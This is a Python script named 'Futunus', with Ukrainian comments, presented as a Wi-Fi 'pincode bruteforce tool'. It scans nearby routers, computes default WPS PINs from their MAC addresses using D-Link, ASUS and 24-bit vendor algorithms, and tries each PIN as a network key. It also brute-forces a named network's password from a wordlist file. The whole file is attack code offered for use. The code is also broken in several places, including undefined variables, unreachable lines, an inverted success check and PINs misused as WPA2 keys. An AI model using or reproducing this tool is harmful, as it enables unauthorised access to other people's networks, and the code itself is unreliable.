#крч, тут в коді невелика путаниця з відступами, ну пох

from pywifi import *
from comtypes import GUID
import time
from math import floor
from rich.console import Console
from rich.panel import Panel
from rich import box
pins = []

wifi = PyWiFi()
iface = wifi.interfaces()[0]
console = Console()
logo = '''  █████▒█    ██ ▄▄▄█████▓ █    ██  ███▄    █  █    ██   ██████ 
▓██   ▒ ██  ▓██▒▓  ██▒ ▓▒ ██  ▓██▒ ██ ▀█   █  ██  ▓██▒▒██    ▒ 
▒████ ░▓██  ▒██░▒ ▓██░ ▒░▓██  ▒██░▓██  ▀█ ██▒▓██  ▒██░░ ▓██▄   
░▓█▒  ░▓▓█  ░██░░ ▓██▓ ░ ▓▓█  ░██░▓██▒  ▐▌██▒▓▓█  ░██░  ▒   ██▒
░▒█░   ▒▒█████▓   ▒██▒ ░ ▒▒█████▓ ▒██░   ███░▒▒█████▓ ▒██████▒▒'''
info = '''
[green]Futunus - pincode bruteforce tool[/]
[green]Made by:[/] [cyan]Slash-02[/]
[green]Team:[/] [cyan]The361[/]
'''.strip()

def connect(ssid, pin):
  profile.ssid = ssid
  profile.auth = const.AUTH_ALG_OPEN
  profile.akm.append(const.AKM_TYPE_WPA2PSK)
  profile.cipher = const.CIPHER_TYPE_CCMP
  profile.key = pin

  profile = iface.add_network_profile(profile)
  iface.connect(profile)


def checksum(mac):
  mac %= 10000000
  var = 0
  temp = mac
  while temp:
    var += 3 * (temp % 10)
    temp = floor(temp / 10)
    var += temp % 10
    temp = floor(temp / 10)
  return (mac * 10) + ((10 - (var % 10)) % 10)

#ну тут караче мага математика і пароль виходить
def get():
    
    One = Two = (int(MAC, 16) & 0xFFFFFF) % 10000000
    Var1 = 0
    while Two:
        Var1 += 3 * (Two % 10)
        Two = floor(Two / 10)
        Var1 += Two % 10
        Two = floor(Two / 10)
    Var2 = (One * 10) + ((10 - (Var1 % 10)) % 10)
    Var3 = str(int(Var2))
    result = Var3.zfill(8)
    pins.append(result)
    
    print(pins)
#і тут тоже
def pin24(BSSID):
  temp = int(BSSID,16) & 0xFFFFFF
  temp = checksum(temp)
  temp = str(int(temp)) #пароль
  pins.append(temp)
  return temp.zfill(8)
#і навіть тут
def pinDLink(BSSID):
  temp = (int(BSSID, 16) & 0xFFFFFF) ^ 0x55AA55
  temp ^= ((temp & 0xF) << 4) | ((temp & 0xF) << 8) | ((temp & 0xF) << 12) | ((temp & 0xF) << 16) | ((temp & 0xF) << 20)
  temp %= 10000000
  if temp < 1000000:
    temp += ((temp % 9) * 1000000) + 1000000
  temp = checksum(temp)
  temp = str(int(temp))
  pins.append(temp)  
  print(pins) #пароль

  return temp.zfill(8)
 
#не повіриш шо тут
#знову те саме
def pinDLinkInc1(BSSID):
  temp = int(BSSID, 16) + 1
  return pinDLink(hex(temp))
  pins.append(temp)
  print(pins) #пароль

#і тут
def pinASUS(BSSID):
  temp = format(int(BSSID, 16), '02x')
  temp = str(temp).zfill(12)
  var = [int(temp[0:2], 16), int(temp[2:4], 16), int(temp[4:6], 16), int(temp[6:8], 16),
     int(temp[8:10], 16), int(temp[10:12], 16)]
  pin = []
  for i in range(7):
    pin.append((var[i % 6] + var[5]) % (10 - ((i + var[1] + var[2] + var[3] + var[4] + var[5]) % 7)))
  temp = int(''.join(str(i) for i in pin))
  temp = checksum(temp)
  temp = str(int(temp))
  pins.append(temp)
  print(pins) #пароль
  return temp.zfill(8)
  






wifi = PyWiFi()
iface = wifi.interfaces()[0]
#це кароче сканить на роутери
iface.scan()
time.sleep(2) #    
result=iface.scan_results()
#цикл для виводу сідів та мак адрес роутерів

console.print(logo, style='red')

console.print(Panel.fit(("[1]Pin brute \n[2]Show network list \n[3]Password brute\n [4]Info")))
while True:
    choice = int(console.input('[blink magenta]{%}>[/]'))

    if choice == 1:
        wifi = PyWiFi()
        iface = wifi.interfaces()[0]
        pins = []
        for i in range(len(result)):
            profile = Profile()
            MAC = result[i].bssid.replace(':', '')   
            console.print(f'[green]{result[i].ssid}[/] [cyan]{result[i].bssid}[/]')


            get()
            pinDLink(MAC.upper())
            pinASUS(MAC.upper())
            pinDLinkInc1(MAC.upper())
        for pin in pins:
            profile.ssid = result[i].ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profile.key = pin

            profile = iface.add_network_profile(profile)
            iface.connect(profile)
        pins.clear()
   
    elif choice == 2:
        for i in range(len(result)):
          console.print(Panel.fit(f'network name: [magenta]{result[i].ssid}[/] \nMAC: [magenta]{result[i].bssid}[/]', box=box.ASCII))

    elif choice == 3:
        profile = Profile()
        #дивись, ось тут сможеш переробити на автоматичне генерування пароля, або может так
        #оставить
        fn = (console.input('[blink magenta]{filename}{%}>[/]'))
        try:
            file = open(fn, 'r')

        except:
            console.print('[italic red]File not found![/]')
        else:
        

            name = console.input('[magenta]NETWORK NAME: [/]')

            profile.ssid = name
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            for password in passwords:
              profile.key = password
              profile = iface.add_network_profile(profile)
              iface.connect(profile)
              if iface.status() != const.IFACE_DISCONNECTED:
                  console.print(f'[cyan]{password}[/] - [red]nope[/]')
              else:
                  console.print(f'[cyan]{password}[/] - [bold green]successfully conected[/]')
                  break

    elif choice == 4:
        console.print(Panel.fit(info, box=box.ASCII))
    else:
      console.print('[red] Unknown mode![/]')



